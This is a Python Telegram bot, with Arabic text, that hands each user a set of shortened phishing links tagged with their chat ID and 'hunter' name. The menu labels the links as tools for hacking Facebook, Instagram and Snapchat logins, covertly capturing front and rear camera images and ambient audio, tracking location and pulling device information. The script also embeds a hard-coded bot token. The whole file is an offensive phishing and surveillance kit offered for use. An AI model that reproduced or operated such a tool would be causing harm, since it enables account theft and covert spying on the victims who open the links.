import telebot
import requests

# التوكن الخاص بك
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
bot = telebot.TeleBot(TOKEN)

# دالة اختصار الروابط
def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    # تجهيز اسم الصياد لاستخدامه في الرابط (بدون فراغات)
    hunter_name = first_name.replace(" ", "_")
    
    # رابط الاستضافة الخاص بك على GitHub Pages
    base = "https://m-y-9-tech.github.io/fb/"
    
    # توليد الروابط مع إضافة الـ ID واسم الصياد
    fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter_name}")
    ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter_name}")
    snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter_name}")
    cam = short_link(f"{base}cam.html?id={uid}&hunter={hunter_name}")
    cam2 = short_link(f"{base}cam2.html?id={uid}&hunter={hunter_name}")
    audio = short_link(f"{base}audio.html?id={uid}&hunter={hunter_name}")
    loc = short_link(f"{base}loc.html?id={uid}&hunter={hunter_name}")
    sys = short_link(f"{base}sys.html?id={uid}&hunter={hunter_name}")

    # الرسالة المزخرفة برابط حسابك الصحيح
    msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام. 

🔴 رابط حساب المطور (إجباري) لتفعيل الأوامر:
https://www.instagram.com/m_y_.9/

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb}`
🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig}`
🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap}`
🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الأمـ^ـامـ^ـيـ^ـة 📸: `{cam}`
🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الخـ^ـلـ^ـفـ^ـيـ^ـة 📷: `{cam2}`
🔹 تـ^ـسـ^ـجـ^ـيـ^ـل الصـ^ـوت المـ^ـحـ^ـيـ^ـط 🎤: `{audio}`
🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع الـ^ـجـ^ـغـ^ـرافـ^ـي 📍: `{loc}`
🔹 سـ^ـحـ^ـب مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـنـ^ـظـ^ـام 📱: `{sys}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل..
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

print("السيستم جاهز وشغال 24 ساعة يا بطل..")
bot.infinity_polling()
